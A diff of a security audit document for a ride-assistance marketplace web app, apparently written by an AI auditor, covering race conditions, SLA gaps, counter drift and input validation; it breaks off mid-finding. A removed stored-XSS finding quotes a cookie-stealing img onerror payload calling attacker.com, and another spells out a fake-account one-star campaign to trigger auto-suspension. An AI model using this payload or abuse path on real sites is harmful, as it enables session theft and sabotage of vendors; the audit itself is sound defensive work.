@@ -1,658 +1,464 @@
 # SECURITY AUDIT PART 2 — Business Logic, API Routes, Input Validation, Data Integrity
 
-**Date:** 2026-06-11
-**Auditor:** Claude Sonnet 4.6 (automated, full source read)
-**Scope:** Quote/dispatch logic, price-change flow, SLA & state machine, input validation, data integrity, ratings
-**Baseline:** Full production conditions — Stripe LIVE, real money, real PII, commission active
-**Files read:** All 28 API routes, migrations 001–038, dispatch.ts, range-estimator.ts, provider-score.ts, geo.ts, ops cron routes
-**Part 1 status:** C1–C5, H1–H7, M1–M7, L1–L5 already documented. Not repeated here.
+**Date:** 2026-06-23
+**Auditor:** Claude AI (automated)
+**Scope:** Part 2 — Business Logic, Dispatch, State Machine, Input Validation, Data Integrity, Ratings
+**Baseline:** Full Production (real users, real money, Stripe live)
 
 ---
 
-## HIGH FINDINGS
+## Executive Summary
+
+The codebase implements a competitive-quote marketplace with atomic RPCs, FOR UPDATE locking, and layered eligibility guards. The most critical new finding in Part 2 is a race condition in the price-change route that allows a provider to permanently record two price changes on a single job by exploiting the TOCTOU window between the read of `price_change_count` and the non-atomic increment. A second critical finding is that the SLA auto-release RPC (`sla_check_and_release`) only fires on requests still in `accepted` status — jobs that have progressed to `en_route` or `arrived` are never auto-released when the SLA timer expires, creating an unbounded active-job lock. Additional high-severity gaps include missing UUID validation on the `GET /api/requests/quotes` query parameter, an unguarded client-side request expiry that mutates state on a GET handler and can race with the cron job, and counter drift when `release_job_atomic` does not decrement `jobs_this_month` on V2 releases. The overall risk posture at production scale is elevated. Several findings from Part 1 (fair-price validation disabled, KYC doc paths leaked, overage not collected) are prerequisites to fixing Part 2 findings and are noted as cross-references only.
 
 ---
 
-### H1 — Ring/Dispatch Eligibility Not Enforced at Quote Submission API
+## Files Read
 
-**Files:** `src/app/api/provider/jobs/quote/route.ts` (entire file), `src/lib/dispatch.ts:33–41`
-**Severity:** HIGH
+**Documentation (5 files read, 2 not found):**
+- `d:\emergancy\موقع سيو\NEXT\rescuego\CLAUDE.md`
+- `d:\emergancy\موقع سيو\NEXT\rescuego\ARCHITECTURE.md`
+- `d:\emergancy\موقع سيو\NEXT\rescuego\MARKETPLACE_V2_SPEC.md`
+- `d:\emergancy\موقع سيو\NEXT\rescuego\PROJECT_HANDOFF.md`
+- `d:\emergancy\موقع سيو\NEXT\rescuego\SECURITY_AUDIT_1.md` (read for deduplication only)
+- `ROADMAP.md` — not found
+- `SESSION_LOG.md` — not found
 
-**Finding:**
-`dispatch.ts` defines ring-based eligibility rules:
-- PPJ providers are excluded from ring 1 (< 5 km) — subscription providers get priority
-- Ring advancement is time-gated (5 min per ring, providers see requests only within their ring)
-- Daily visibility limits differ per plan (PPJ: 3, Starter: 5, Pro: 10, Business: 20)
+**API Routes (12 files):**
+- `src/app/api/provider/jobs/quote/route.ts`
+- `src/app/api/customer/quote/select/route.ts`
+- `src/app/api/requests/quotes/route.ts`
+- `src/app/api/provider/jobs/price-change/route.ts`
+- `src/app/api/customer/price-change/respond/route.ts`
+- `src/app/api/provider/jobs/complete/route.ts`
+- `src/app/api/provider/jobs/advance-state/route.ts`
+- `src/app/api/provider/jobs/release/route.ts`
+- `src/app/api/requests/route.ts`
+- `src/app/api/requests/cancel/route.ts`
+- `src/app/api/ratings/route.ts`
+- `src/app/api/ops/marketplace-cron/route.ts`
 
-These rules are enforced **only in the dashboard display layer** (`filterDispatchCandidates`, `computeCurrentRing`). Neither the quote submission route nor `submit_quote_atomic` checks ring eligibility, PPJ ring-1 exclusion, or the time-based ring advancement.
+**Lib files (3 files):**
+- `src/lib/dispatch.ts`
+- `src/lib/provider-score.ts`
+- `src/lib/range-estimator.ts`
 
-The route checks:
-1. Provider `status = active` ✓
-2. Provider has a fresh online location ✓
-3. Request is `open` or `quoted` ✓
-4. `submit_quote_atomic` checks active job capacity and daily quote count ✓
+**Types (2 files):**
+- `src/types/database.ts`
+- `src/types/index.ts`
 
-Missing checks:
-- Distance from provider to request ≤ current ring radius
-- PPJ providers excluded from ring 1
-- Time-based ring advancement (only providers within the active ring see the request)
+**Migrations (13 files):**
+- `supabase/migrations/001_initial_schema.sql`
+- `supabase/migrations/020_release_job_atomic.sql`
+- `supabase/migrations/026_advance_state_atomic.sql`
+- `supabase/migrations/028_stuck_job_auto_release.sql`
+- `supabase/migrations/029_rpc_add_en_route_arrived_statuses.sql`
+- `supabase/migrations/031_marketplace_v2_schema.sql`
+- `supabase/migrations/032_disable_range_estimator.sql`
+- `supabase/migrations/033_nearby_requests_include_quoted.sql`
+- `supabase/migrations/034_cancel_allow_quoted_status.sql`
+- `supabase/migrations/035_nearby_requests_add_destination.sql`
+- `supabase/migrations/037_rls_force_and_explicit_deny.sql`
+- `supabase/migrations/038_provider_kyc.sql`
 
-**Attack scenario:**
-A PPJ provider (paying AED 30–70/job) calculates their ring-1 exclusion will hurt their profits. They send a direct API call to `POST /api/provider/jobs/quote` for any open request within 5 km. The route accepts it. They compete directly with Business plan subscribers (AED 500–1000+/month) on ring-1 jobs. Business subscribers pay for ring-1 priority that is never enforced.
-
-**Fix direction:** Add ring eligibility check to the quote route using `isProviderEligibleForRing` and `computeCurrentRing` before calling the RPC; add `p_max_distance_km` parameter to `submit_quote_atomic` and enforce it inside the RPC where the provider row is locked.
-
----
-
-### H2 — `release_job_atomic` Does Not Clear `selected_quote_id` — Stale FK Sets Wrong Completion Price via Legacy Path
-
-**Files:** `supabase/migrations/028_stuck_job_auto_release.sql:48–55`, `supabase/migrations/031_marketplace_v2_schema.sql:773–780`
-**Severity:** HIGH
-
-**Finding:**
-When a provider manually releases a V2-accepted job, `release_job_atomic` resets:
-```sql
-UPDATE requests SET status = 'open', accepted_by = NULL WHERE ...
-```
-It does **not** clear `selected_quote_id`, `accepted_at`, or `price_change_*` fields.
-
-After release, the request is `open` with `selected_quote_id` still pointing to the original provider's quote. If the legacy accept path picks up this request (PPJ payment / overage webhook calls `accept_provider_request_atomic` which only requires `status = 'open'`), then when the new provider completes the job, `complete_provider_job_atomic` derives the final price:
-```sql
-ELSIF v_request.selected_quote_id IS NOT NULL THEN
-  SELECT proposed_price::INTEGER INTO v_derived_price
-  FROM request_quotes WHERE id = v_request.selected_quote_id;
-```
-The stale `selected_quote_id` causes the new provider's completion to be priced at the **original provider's old quote**, not any price agreed with Provider B. The customer is billed at the wrong price with no visibility into the mismatch.
-
-Additionally, `release_job_atomic` does not mark the previously-selected quote as `rejected` in `request_quotes` (unlike `sla_check_and_release` which does). After release, the quote row remains `status = 'selected'` indefinitely.
-
-**Fix direction:** In `release_job_atomic` (migration 039), add:
-```sql
-UPDATE requests SET selected_quote_id = NULL, accepted_at = NULL, price_change_status = NULL, price_change_requested = NULL WHERE id = p_request_id;
-UPDATE request_quotes SET status = 'rejected' WHERE request_id = p_request_id AND status = 'selected';
-```
+**Note:** `033_marketplace_v2_helpers.sql` was not found at that path; actual file is `033_nearby_requests_include_quoted.sql`. `036_provider_location_lat_lng_columns.sql` was found via glob but not fully read.
 
 ---
 
-### H3 — `release_job_atomic` and `expire_stuck_active_requests` Do Not Decrement `jobs_this_month`
-
-**Files:** `supabase/migrations/028_stuck_job_auto_release.sql:74–77, 130–133`, `supabase/migrations/031_marketplace_v2_schema.sql:566–568`
-**Severity:** HIGH
-
-**Finding:**
-`jobs_this_month` is incremented unconditionally in `select_quote_atomic` (every accepted V2 job). Decrements happen inconsistently across release paths:
-
-| Path | Decrements `jobs_this_month` |
-|---|---|
-| `sla_check_and_release` (SLA breach) | ✅ YES |
-| `cancel_request_and_compensate_atomic` (late cancel) | ✅ YES (subscription plans only) |
-| `release_job_atomic` (provider-initiated release) | ❌ NO |
-| `expire_stuck_active_requests` (auto-release after 3 h) | ❌ NO |
-
-A Starter plan provider (15 jobs/month) who releases 5 jobs mid-month has used 5 allowance slots without completing any work. Their remaining 10 slots are their real monthly capacity. The monthly allowance reset cron restores this, but within any given month the counter overstates usage by the number of released jobs.
-
-Secondary impact: `GET /api/requests/quotes` uses `jobs_this_month` as `completedJobs` in `computeProviderScore`:
-```typescript
-completedJobs: provider.jobs_this_month ?? 0,
-acceptanceRate: computeAcceptanceRate(provider.jobs_this_month ?? 0, (provider.jobs_this_month ?? 0) + 1),
-```
-Inflated counters from releases artificially boost a provider's apparent score.
-
-**Fix direction:** In `release_job_atomic` and `expire_stuck_active_requests`, add `jobs_this_month = GREATEST(0, COALESCE(jobs_this_month, 0) - 1)` to the provider UPDATE, mirroring `sla_check_and_release`.
+## Critical Findings
 
 ---
 
-### H4 — Provider Auto-Suspension Trigger Has No Admin Review Gate
+### CRIT-01 — Price-Change Count Enforced by Read-Then-Write (Race Allows Two Price Changes)
 
-**Files:** `supabase/migrations/001_initial_schema.sql:189–200`
-**Severity:** HIGH
+- **Severity:** Critical
+- **File(s):** `src/app/api/provider/jobs/price-change/route.ts:44–74`
+- **Attack / Failure Scenario:**
+  The route reads `price_change_count` from the DB at lines 44–46, then checks `if (request.price_change_count >= 1)` at line 65, then performs a separate `admin.from('requests').update({price_change_count: (request.price_change_count ?? 0) + 1, ...})` at lines 69–78. There is no database-level lock or atomic compare-and-swap on this increment.
 
-**Finding:**
-```sql
-CREATE OR REPLACE FUNCTION check_provider_suspension()
-RETURNS TRIGGER AS $$
-BEGIN
-  IF NEW.rating < 3.0 AND (SELECT COUNT(*) FROM ratings WHERE provider_id = NEW.id) >= 5 THEN
-    UPDATE providers SET status = 'suspended' WHERE id = NEW.id;
-  END IF;
-  RETURN NEW;
-END;
-```
-This trigger fires `AFTER UPDATE OF rating ON providers`, which is itself triggered by `update_provider_rating()` after every new rating INSERT.
-
-**Exploitation path (requires 5 real completed jobs):**
-1. Attacker creates 5 customer accounts
-2. Hires the target provider for 5 small jobs (completing legitimate service requests)
-3. All 5 accounts rate the provider 1 star
-4. Provider's average rating drops below 3.0 with ≥ 5 ratings
-5. Trigger auto-suspends the provider — no admin intervention needed
-6. Provider is removed from the marketplace until an admin manually reactivates
-
-A new provider with fewer than 5 lifetime reviews is the most vulnerable. A provider who has received 4 perfect ratings needs only one 1-star review to be at risk if the other 4 reviews stay at 4+ stars — once a 5th review drops the average below 3.0, suspension fires.
-
-**Additional concern:** The trigger has no exponential back-off or cooldown — one extra low rating can tip a previously-safe provider over the threshold at any time.
-
-**Fix direction:** Remove the automatic suspension trigger. Route the suspension decision through admin review: set a flag (e.g., `low_rating_flag`) when the threshold is crossed, alert the admin dashboard, and require a human decision before status changes.
+  Two simultaneous POST requests from the same provider for the same `request_id` (double-click, network retry, scripted race) can both read `price_change_count = 0`, both pass the `>= 1` guard, and both execute the update — resulting in `price_change_count = 2` and two separate `price_change_requested` values written. The final `price_change_requested` on the row is whichever write arrived last. More critically: the second price-change event overwrites `price_change_status` back to `'pending'`, resetting a customer's prior `rejected` decision. The customer sees a fresh pending request for a second (higher) price and may approve it, thinking it is a first request.
+- **Exploitability:** Medium — requires two concurrent requests within milliseconds; achievable with scripted retry, double-click, or HTTP race tool.
+- **Production Impact:** Provider can obtain approval for a price change the customer had already rejected. The approved price becomes the final job price via `complete_provider_job_atomic`'s price-derivation logic (migration 031 lines 773–780). Customer pays more than intended.
+- **Fix Direction:** Move enforcement into the DB. Create an RPC that does `UPDATE requests SET price_change_count = price_change_count + 1, price_change_requested = $new_price, price_change_status = 'pending' WHERE id = $id AND accepted_by = $provider_id AND status = 'in_progress' AND price_change_count = 0 RETURNING id`. Return failure if row count is 0.
 
 ---
 
-### H5 — Price Change Route Returns 200 on Zero-Row UPDATE After Job Completion Race
+### CRIT-02 — SLA Auto-Release Only Fires on `accepted` Status; `en_route` and `arrived` Jobs Permanently Locked Until Weekly Cron
 
-**Files:** `src/app/api/provider/jobs/price-change/route.ts:69–88`
-**Severity:** HIGH
+- **Severity:** Critical
+- **File(s):** `src/app/api/ops/marketplace-cron/route.ts:115–121`, `supabase/migrations/031_marketplace_v2_schema.sql:641–644`
+- **Attack / Failure Scenario:**
+  The `enforceSla` function in marketplace-cron (lines 115–121) queries `WHERE status = 'accepted'`. The `sla_check_and_release` RPC (migration 031 line 642) requires `v_request.status <> 'accepted'` to return early. Once a provider advances a job to `en_route` or `arrived`, the marketplace cron never picks it up for SLA enforcement — regardless of how long the provider remains unresponsive.
 
-**Finding:**
-The price-change route reads the request status and checks `price_change_count` in a pre-flight fetch, then issues an UPDATE:
-```typescript
-const { error: updateError } = await admin
-  .from('requests')
-  .update({ price_change_requested: ..., price_change_status: 'pending', price_change_count: ... })
-  .eq('id', parsed.data.request_id)
-  .eq('accepted_by', user.id)
-  .eq('status', 'in_progress')
-
-if (updateError) { return 500 }
-return NextResponse.json({ success: true })  // ← always reached if no DB error
-```
-If the job is completed (or SLA-released) concurrently — transitioning status away from `in_progress` — the UPDATE affects 0 rows. Supabase returns no error for a zero-row UPDATE; `updateError` is null. The route returns `{ success: true }`.
-
-The provider's UI shows the price change was submitted. The customer's UI shows a pending price change notification. But in the database, no change occurred. If the customer acts on this phantom notification (trying to approve/reject), they will receive a 409 `No pending price change to respond to`.
-
-This is a false confirmation of a business action that did not occur.
-
-**Fix direction:** After the UPDATE, re-read the row (or use PostgreSQL's `RETURNING` via an RPC) to verify `price_change_status = 'pending'`. Return 409 if 0 rows were updated.
+  A provider can accept a job, immediately call `advance-state` to move it to `en_route` (taking it out of the marketplace cron's SLA scope), and then abandon the job. The customer is locked to this provider with no automated recovery path. The only release mechanisms available are:
+  1. Customer manually cancels (requires customer awareness and action).
+  2. Provider manually releases (requires provider cooperation — not applicable for abandonment).
+  3. The weekly `expire_stuck_active_requests` cron (`/api/ops/weekly-sla-reset`) — runs at most once per week.
+- **Exploitability:** Easy — a provider who wants to block a customer from re-querying the marketplace simply accepts, marks `en_route`, and disappears.
+- **Production Impact:** Customer cannot get service. Request remains locked to a non-responding provider for up to one week. Active job slot is occupied, causing `jobs_this_month` counter inflation (HIGH-04). Customer's only self-service recovery is manual cancellation, which may not be obvious from the UI.
+- **Fix Direction:** Extend `enforceSla` in marketplace-cron to query `status IN ('accepted', 'en_route', 'arrived')`. Extend `sla_check_and_release` to handle release from these states, or create a new RPC for en_route/arrived SLA release that sets the request back to `quoted` or `open` as appropriate.
 
 ---
 
-### H6 — Stored XSS Risk in User-Supplied Text Fields Rendered in Admin/Provider UIs
-
-**Files:** `src/app/api/requests/route.ts:13, 22`, `src/app/api/ratings/route.ts:11`, `src/app/api/admin/providers/update/route.ts:21`
-**Severity:** HIGH
-
-**Finding:**
-The following user-supplied text fields are stored without HTML sanitization:
-- `note` (customer note, up to 500 chars) — displayed to providers on the dashboard request cards
-- `destination` / `destination_area` (up to 300/150 chars) — displayed to providers in the dashboard
-- `rating.comment` (up to 500 chars) — displayed in admin panel and potentially provider ratings page
-- `provider_kyc_log.notes` / `review_notes` (up to 1000 chars) — displayed in admin provider review
-
-If any page renders these fields using `dangerouslySetInnerHTML`, `.innerHTML`, or with insufficient escaping (e.g., JSX attribute interpolation without sanitization), a malicious input like:
-```html
-<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
-```
-executes in the admin's or provider's browser. At production, admin-panel XSS leads to session token theft and full admin access.
-
-Zod `trim()` is applied to some fields but does not escape HTML entities.
-
-**Fix direction:** Before storing, HTML-encode all user-supplied text fields using a server-side sanitizer (e.g., `DOMPurify` with `ALLOWED_TAGS: []`). Alternatively, verify that all rendering pages use React's default HTML-safe text interpolation (JSX `{}` without `dangerouslySetInnerHTML`) and add an explicit audit of every page that displays these fields.
+## High Findings
 
 ---
 
-## MEDIUM FINDINGS
+### HIGH-01 — `GET /api/requests/quotes` Accepts Unvalidated String as `request_id` Query Parameter
+
+- **Severity:** High
+- **File(s):** `src/app/api/requests/quotes/route.ts:45–84`
+- **Attack / Failure Scenario:**
+  The `request_id` query parameter is read directly from `req.nextUrl.searchParams.get('request_id')` at line 45 and passed without format validation to `admin.from('requests').select(...).eq('id', requestId)` at line 68. There is no `z.string().uuid()` check. This differs from every other route in the codebase that accepts a request/quote ID in the body — all of those use Zod UUID validation.
+
+  Consequences:
+  1. Any arbitrary string (including empty string, very long strings, or values that trigger unusual PostgREST error formatting) is sent to the DB. PostgreSQL will cast-fail on non-UUID values and return a 400 or empty result, but the specific error message varies and may leak internal information about the query structure.
+  2. Any authenticated user of any role (provider, admin) can call this endpoint. The ownership check `request.customer_id !== user.id` at line 83 is the only access gate — but it only runs if the DB returns a row. Non-UUID inputs get caught by the DB before ownership is checked, yielding a different response path from "not found."
+  3. Without UUID validation, an attacker can enumerate request ID format behavior: a valid UUID with no matching row returns `{ data: [], count: 0 }` (via the `request.status !== 'quoted'` path at line 88). A malformed non-UUID returns a DB error mapped to a different HTTP status.
+- **Exploitability:** Low direct exploit risk; medium for response-timing/format probing.
+- **Production Impact:** Inconsistent error responses for malformed input. A provider or admin can probe the endpoint to distinguish "UUID that exists but not customer-owned" from "malformed input" — leaking information about ID validity.
+- **Fix Direction:** Add `if (!requestId || !/^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(requestId))` check after line 47, or use `z.string().uuid().safeParse(requestId)`.
 
 ---
 
-### M1 — `expireUnselectedRequests` and `expireStaleQuotes` Run in Parallel, Not Atomically
+### HIGH-02 — Client-Side Request Expiry in `GET /api/requests` Performs a State-Mutating Write on a Read Endpoint
 
-**File:** `src/app/api/ops/marketplace-cron/route.ts:24–38`
-**Severity:** MEDIUM
-
-**Finding:**
-The marketplace cron runs three tasks in `Promise.all`:
-```typescript
-const [expireQuotesResult, expireRequestsResult, slaResult] = await Promise.all([
-  expireStaleQuotes(supabase),
-  expireUnselectedRequests(supabase, now),
-  enforceSla(supabase, now),
-])
-```
-`expireStaleQuotes` marks `request_quotes.status = 'expired'` where `expires_at < now`.
-`expireUnselectedRequests` marks `requests.status = 'expired'` where `quoted_at` is 20 minutes old.
-
-These are separate, non-atomic operations. Between the two, brief states exist:
-- Request is `expired` but some of its pending quotes are still `pending` (quote validity > 20 min)
-- Quotes are `expired` but the parent request is still `quoted` (quote validity < request timeout)
-
-In the second window, `GET /api/requests/quotes` returns `[]` (no pending non-expired quotes) but the request is still `quoted`, causing the customer UI to show an empty quote list without indicating the request has expired.
-
-**Fix direction:** Expire stale quotes first; expire the request only after all its pending quotes have been expired or use a single Postgres RPC that atomically handles both.
+- **Severity:** High
+- **File(s):** `src/app/api/requests/route.ts:136–149`
+- **Attack / Failure Scenario:**
+  The GET handler for customer requests performs an unconditional DB write when a `quoted` request is older than 20 minutes (lines 136–149):
+  ```typescript
+  await admin.from('requests').update({ status: 'expired' })
+    .eq('id', activeRequest.id).eq('status', 'quoted')
+  activeRequest = null
+  ```
+  Problems:
+  1. **HTTP semantics violation:** GET endpoints must be idempotent. This GET mutates DB state on every call when the condition is met. Every customer dashboard poll triggers the mutation.
+  2. **No error handling:** The update has no `catch` or error check. If the update fails (DB timeout, network error), `activeRequest = null` is still set, so the customer sees "no active request" but the DB row is still `quoted`. Providers continue to see and quote this expired-in-UI request.
+  3. **Race with marketplace-cron:** Both this handler and `expireUnselectedRequests` in the cron can attempt to set `status = 'expired'` simultaneously. The `.eq('status', 'quoted')` guard makes the data side idempotent, but two concurrent DB writes are generated.
+  4. **Race with quote selection:** If the customer loads the dashboard while simultaneously selecting a quote (two browser tabs or two devices), the GET expiry may see `quoted` (stale snapshot) and attempt to expire it while `select_quote_atomic` is transitioning to `accepted`. The update's WHERE clause (`.eq('status', 'quoted')`) provides protection — if the RPC committed first, the expiry update finds no `quoted` row. But the GET still returns `active_request: null`, misleading the customer.
+- **Exploitability:** Not directly exploitable; this is a reliability and correctness concern.
+- **Production Impact:** Stale data inconsistency under DB write failures. Unnecessary write load from high-frequency customer polling. Customer may see a misleading "no active request" state.
+- **Fix Direction:** Remove the inline expiry logic from the GET handler entirely. Rely on the marketplace-cron for all request expiry. The cron runs frequently enough to handle the 20-minute window.
 
 ---
 
-### M2 — Price Change Count Is Not Atomic — Race Allows Multiple Price Changes Per Job
+### HIGH-03 — `release_job_atomic` Does Not Decrement `jobs_this_month` for V2 Jobs
 
-**File:** `src/app/api/provider/jobs/price-change/route.ts:65–75`
-**Severity:** MEDIUM
+- **Severity:** High
+- **File(s):** `supabase/migrations/028_stuck_job_auto_release.sql:61–78`, `supabase/migrations/031_marketplace_v2_schema.sql:566–569`
+- **Attack / Failure Scenario:**
+  `select_quote_atomic` increments `providers.jobs_this_month` at line 568 when a V2 quote is selected. The `cancel_request_and_compensate_atomic` RPC (migration 034, lines 163–168) correctly decrements `jobs_this_month` when the customer cancels. However, `release_job_atomic` (migration 028, lines 61–78) increments `release_count` and `provider_side_cancellation_count` but does NOT decrement `jobs_this_month`.
 
-**Finding:**
-The check-then-update is two separate operations with no optimistic lock on `price_change_count`:
-```typescript
-if (request.price_change_count >= 1) {
-  return 409  // guard passes if count = 0
-}
-...
-await admin.from('requests').update({
-  price_change_count: (request.price_change_count ?? 0) + 1,  // computes from stale read
-  price_change_requested: parsed.data.new_price,
-  price_change_status: 'pending',
-}).eq('id', ....).eq('status', 'in_progress')
-```
-Two concurrent requests both read `price_change_count = 0`, both pass the `>= 1` guard. Both execute the UPDATE with `price_change_count = 1`. The last write wins for `price_change_requested`. Since there's a rate limit of 5/minute, a provider can fire 5 rapid concurrent requests with different `new_price` values. The customer sees the last-written price as the pending change, but the provider has multiple 200 confirmations.
-
-**Fix direction:** Replace the two-step pattern with an atomic UPDATE:
-```typescript
-.update({ price_change_count: 1, price_change_requested: ..., price_change_status: 'pending' })
-.eq('id', ...).eq('status', 'in_progress').eq('price_change_count', 0)
-```
-Then check rows affected to confirm the update succeeded.
+  A Starter-plan provider (limit: 15 jobs/month) who accepts-then-releases 5 jobs effectively loses 5 monthly slots permanently (for that month), reducing their usable quota to 10. If they reach their computed `jobs_this_month = 15` through a mix of real completions and releases, they are blocked from quoting even if they have not completed 15 real jobs.
+- **Exploitability:** Not an external exploit — this is a business-logic data integrity defect.
+- **Production Impact:** Provider monthly allowance under-counted for every released V2 job. Provider may be false-positive blocked from quoting. Monthly billing may be inaccurate.
+- **Fix Direction:** Add to `release_job_atomic` (migration 028): `jobs_this_month = GREATEST(0, COALESCE(jobs_this_month, 0) - 1)` in the providers UPDATE, conditional on whether the request had a `selected_quote_id` (V2 path). Add a migration 039 to update the existing RPC.
 
 ---
 
-### M3 — `advance_provider_job_state` RPC Accepts Arbitrary `p_to_status` — Route Is the Only Transition Guard
+### HIGH-04 — `jobs_this_month` Permanently Inflated for Stuck `en_route`/`arrived` Jobs (Consequence of CRIT-02)
 
-**File:** `supabase/migrations/026_advance_state_atomic.sql:26–36`
-**Severity:** MEDIUM
-
-**Finding:**
-```sql
-UPDATE public.requests
-SET    status = p_to_status
-WHERE  id          = p_request_id
-  AND  accepted_by = p_provider_id
-  AND  status      = p_from_status;
-```
-The RPC performs no whitelist validation on `p_to_status`. Any service-role caller can advance a job backward (e.g., `in_progress → accepted`) or skip states (e.g., `accepted → in_progress`). The `requests_status_check` DB constraint allows all valid status strings but does not enforce forward-only transitions.
-
-The route's `VALID_TRANSITIONS` table is the sole guard. If any future server-side code path calls the RPC directly (e.g., a migration, a new admin endpoint, or an ops cron), invalid transitions will succeed silently.
-
-**Fix direction:** Add a whitelist check inside the RPC:
-```sql
-IF (p_from_status, p_to_status) NOT IN (
-  ('accepted','en_route'), ('en_route','arrived'), ('arrived','in_progress')
-) THEN
-  RETURN QUERY SELECT FALSE, 'invalid_transition'::TEXT, NULL::TEXT; RETURN;
-END IF;
-```
+- **Severity:** High
+- **File(s):** `supabase/migrations/031_marketplace_v2_schema.sql:692–698`, `src/app/api/ops/marketplace-cron/route.ts:115–121`
+- **Attack / Failure Scenario:**
+  `sla_check_and_release` correctly decrements `jobs_this_month` when it releases an SLA-breached job (line 696). But as established in CRIT-02, `sla_check_and_release` only runs for `accepted` status. Jobs that advanced to `en_route` or `arrived` and are then abandoned remain in those states until the weekly `expire_stuck_active_requests` cron fires. That cron does NOT decrement `jobs_this_month` (see LOW-03). Result: for a stuck `en_route`/`arrived` job, `jobs_this_month` is incremented by `select_quote_atomic` and never decremented until the monthly reset.
+- **Exploitability:** Not directly exploitable; consequence of CRIT-02.
+- **Production Impact:** For each stuck `en_route`/`arrived` job between weekly cron runs, the provider's monthly slot is consumed even though no service was delivered. At scale this compounds with HIGH-03 to create significant counter drift.
+- **Fix Direction:** Fix CRIT-02 first. The decrement logic in `sla_check_and_release` is correct and should be preserved in the extended version.
 
 ---
 
-### M4 — `cancel_request_and_compensate_atomic` Does Not Clear `accepted_by` or `selected_quote_id`
+### HIGH-05 — Rating Row Does Not Store `customer_id` — No Audit Trail Linking Rating to Submitting Customer
 
-**File:** `supabase/migrations/034_cancel_allow_quoted_status.sql:52–60`
-**Severity:** MEDIUM
+- **Severity:** High
+- **File(s):** `src/app/api/ratings/route.ts:77–85`, `supabase/migrations/001_initial_schema.sql:57–64`
+- **Attack / Failure Scenario:**
+  The rating insert at lines 77–85 writes: `{ job_id, provider_id, stars, comment }`. The `ratings` table (migration 001 lines 57–64) has no `customer_id` column. Rating ownership is enforced at query time (route line 63 checks job ownership via session user), but the submitted rating does not record which customer submitted it.
 
-**Finding:**
-On late cancellation of an accepted job:
-```sql
-UPDATE requests
-SET status = 'cancelled', cancelled_at = p_now, ...
-WHERE id = p_request_id AND status IN ('open', 'quoted', 'accepted', ...);
-```
-Fields not cleared: `accepted_by`, `selected_quote_id`, `accepted_at`, `price_change_*`.
-
-After cancellation, the request row holds stale FK references to the provider and quote. The `jobs` record also remains (no `DELETE FROM jobs` in the cancel RPC). The provider's `jobs_this_month` is decremented only for subscription plans, not PPJ.
-
-While the `cancelled` status prevents further business logic from executing, this orphaned data complicates reconciliation, admin audits, and any future re-use of request data.
-
-**Fix direction:** In `cancel_request_and_compensate_atomic`, add: `accepted_by = NULL, selected_quote_id = NULL, accepted_at = NULL` to the cancellation UPDATE.
+  Consequences:
+  1. If a malicious or disputed rating is submitted, there is no DB record linking the `ratings` row to the customer who created it. Only application logs contain this association.
+  2. Audit queries like "show me all ratings by customer X" require a JOIN through `jobs` and `requests`, which works if the data is intact — but if any row in that chain is deleted or modified, the attribution is lost.
+  3. The `update_provider_rating` trigger (migration 001 lines 170–183) computes provider average rating from the last 50 ratings using `WHERE provider_id = NEW.provider_id`. There is no fraud detection — any rating that passes the route-level ownership check is included in the average.
+- **Exploitability:** Not directly exploitable — route-level ownership prevents unauthorized submissions.
+- **Production Impact:** Under UAE consumer dispute resolution requirements, a rating that cannot be definitively attributed to a customer in the DB is an audit gap. Provider disputes over ratings have no DB-level attribution evidence.
+- **Fix Direction:** Add `customer_id UUID REFERENCES users(id)` to the `ratings` table in migration 039. Include `customer_id: user.id` in the insert.
 
 ---
 
-### M5 — `cancellation_count` Counter Update Silently Fails on Concurrent Cancellations
+### HIGH-06 — Price-Change Respond Route Update Lacks `status = 'in_progress'` Guard
 
-**File:** `src/app/api/requests/cancel/route.ts:163–170`
-**Severity:** MEDIUM
-
-**Finding:**
-The cancel route uses an optimistic lock for the counter increment:
-```typescript
-await admin
-  .from('users')
-  .update({ cancellation_count: (profile.cancellation_count ?? 0) + 1, ... })
-  .eq('id', user.id)
-  .eq('cancellation_count', profile.cancellation_count ?? 0)
-// ↑ no error check on this UPDATE
-```
-If two cancellations race, the optimistic lock correctly prevents double-increment for the second request. But the return value is not checked — if the update matches 0 rows (concurrent update beat it), the counter silently stays un-incremented. The cancellation itself succeeded (the RPC already ran), so the customer's cancellation history is understated.
-
-Over time, `cancellation_count` and `late_cancellation_count` drift below their true values. These counters are displayed to customers and used for late-cancellation warnings.
-
-**Fix direction:** Check the update result; retry or log on optimistic lock failure. Alternatively, move the counter increment inside the cancel RPC as an atomic `jobs_this_month`-style UPDATE.
+- **Severity:** High
+- **File(s):** `src/app/api/customer/price-change/respond/route.ts:67–73`
+- **Attack / Failure Scenario:**
+  The respond route reads `request.status` at line 44–46 and checks `request.status !== 'in_progress'` at line 61. The subsequent UPDATE at lines 67–73 is:
+  ```typescript
+  await admin.from('requests').update({ price_change_status: newStatus })
+    .eq('id', parsed.data.request_id)
+    .eq('customer_id', user.id)
+    .eq('price_change_status', 'pending')
+  ```
+  There is no `.eq('status', 'in_progress')` guard on the UPDATE. Between the route's read (line 44) and the update (line 67), the request can transition from `in_progress` to `completed` (via the provider calling `/api/provider/jobs/complete`). The `complete_provider_job_atomic` RPC derives `final_price` at the moment of completion — using the selected quote price since `price_change_status = 'pending'` (not yet approved). After completion, the customer's respond call arrives and sets `price_change_status = 'approved'` on the now-completed request. The DB state becomes: `status = 'completed'`, `price_change_status = 'approved'`, `final_price = <quote price>`. The customer is shown "price change approved" but was charged the quote price, not the approved price change.
+- **Exploitability:** Low — requires an unlikely timing race between provider completion and customer response.
+- **Production Impact:** Misleading data state. Customer UI may display "price change approved" when the actual charge used the original quote price. Creates billing dispute surface.
+- **Fix Direction:** Add `.eq('status', 'in_progress')` to the UPDATE WHERE clause at line 67–73.
 
 ---
 
-### M6 — SLA Cron Only Targets `accepted` Status — Providers Who Advance to `en_route` Avoid 20-Minute Penalty
-
-**File:** `src/app/api/ops/marketplace-cron/route.ts:114–120`
-**Severity:** MEDIUM
-
-**Finding:**
-```typescript
-const { data: breachedRequests } = await supabase
-  .from('requests')
-  .select('id, accepted_at')
-  .eq('status', 'accepted')  // ← only accepted
-  .not('accepted_at', 'is', null)
-  .lt('accepted_at', slaDeadlineCutoff)
-```
-The 20-minute SLA applies only to requests still in `accepted` status. A provider who accepts a job and immediately calls `POST /api/provider/jobs/advance-state` (advancing to `en_route`) bypasses the SLA check entirely. The `sla_check_and_release` RPC also returns early if `status <> 'accepted'`:
-```sql
-IF v_request.status <> 'accepted' THEN
